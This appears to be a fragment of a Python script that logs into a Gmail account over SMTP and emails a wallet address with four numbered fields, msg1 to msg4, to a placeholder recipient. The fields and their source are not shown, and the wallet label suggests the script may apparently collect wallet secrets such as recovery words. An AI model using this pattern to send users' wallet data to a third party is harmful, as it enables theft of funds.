import smtplib, ssl
from email.mime.text import MIMEText


sender = '@gmail.com'
receiver = '@gmail.com'
info = f"Wallet: {address} \n1: {msg1} \n2: {msg2}\n3: {msg3}\n4: {msg4}"

msg = MIMEText(info)

msg['Subject'] = 'Test mail'
msg['From'] = '@gmail.com'
msg['To'] = '@gmail.com'

user = '@gmail.com'
password = 'PASSWORD'


context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender, password)
    server.sendmail(sender, receiver, msg.as_string())
    print("mail successfully sent")
